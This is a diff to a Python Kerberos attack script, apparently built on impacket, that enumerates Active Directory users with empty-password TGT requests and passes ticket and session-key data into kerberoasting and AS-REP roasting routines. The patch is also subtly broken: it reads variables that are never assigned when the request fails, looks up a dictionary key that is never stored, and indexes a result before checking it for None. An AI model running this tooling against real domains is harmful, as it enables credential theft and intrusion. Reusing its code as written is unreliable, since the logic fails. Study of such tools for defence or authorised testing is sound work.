@@ -33,19 +33,19 @@ def enumerate_user(user, domain, dc):
     dc_ip = socket.gethostbyname(dc)
     userclient = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
     try:
-        getKerberosTGT(userclient,domain=domain,kdcHost=dc_ip, password='',
+        tgt, cipher, oldSessioKey, sessionKey =getKerberosTGT(userclient,domain=domain,kdcHost=dc_ip, password='',
                            lmhash='', nthash='')
     except SessionError as e:
         code = e.getErrorCode()
         if code != 6:
             print(f'[+] Found user: {user}@{domain}')
-            return user
+            return {'user':user, 'tgt':tgt, 'cipher':cipher, 'oldSessionKey': oldSessioKey, 'sessionKey': sessionKey}
         else:
             return None
     except Exception as e:
         #print(e)
         print(f'[+] possible kerberoastable or asrep raostable user: {user}@{domain}')
-        return user
+        return {'user':user, 'tgt':tgt, 'cipher':cipher, 'oldSessionKey': oldSessioKey, 'sessionKey': sessionKey}
         
 
         # userclient = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
@@ -88,13 +88,18 @@ def enumerate_user(user, domain, dc):
 
 def get_userTGT(user, domain, dc):
     valid = enumerate_user(user, domain, dc)
+    tgt = valid['tgt']
+    user = valid['user']
+    cipher = valid['cipher']
+    oldSessionKey = valid['oldSessionKey']
+    newSessionKey = valid['newSessionKey']
     if valid != None:
         try:
-            T = TGT(domain=domain, username=valid, dc=dc)
+            T = TGT(domain=domain, username=user, dc=dc)
             tgt_data = T.run()
         except:
             try:
-                Ts = TGS(domain=domain, username=valid, dc=dc)
+                Ts = TGS(domain=domain, username=user, dc=dc, tgt=tgt, cipher=cipher, oldSessionKey=oldSessionKey, newSessionKey=newSessionKey)
                 tgt_data = Ts.run(roast=True)
             except Exception as e:
                 print(e)
